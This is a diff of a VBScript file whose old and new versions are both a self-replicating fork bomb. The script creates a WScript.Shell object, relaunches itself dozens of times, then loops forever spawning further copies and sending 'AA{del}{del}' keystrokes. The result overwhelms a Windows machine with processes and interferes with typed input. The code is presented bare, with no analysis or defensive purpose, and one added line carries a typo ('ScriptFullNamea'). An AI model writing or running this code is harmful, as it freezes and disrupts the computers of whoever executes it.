@@ -1,32 +1,35 @@
-Set auto = create.object("wscript.shell")
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
-auto.run WScript.ScriptFullName
+Set auto=CreateObject("wscript.shell")
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
 do
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.run WScript.ScriptFullName
-  auto.sendkeys "AA{delete}{delete}"
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullName
+auto.Run WScript.ScriptFullNamea
+auto.sendkeys "AA{del}{del}"
 loop
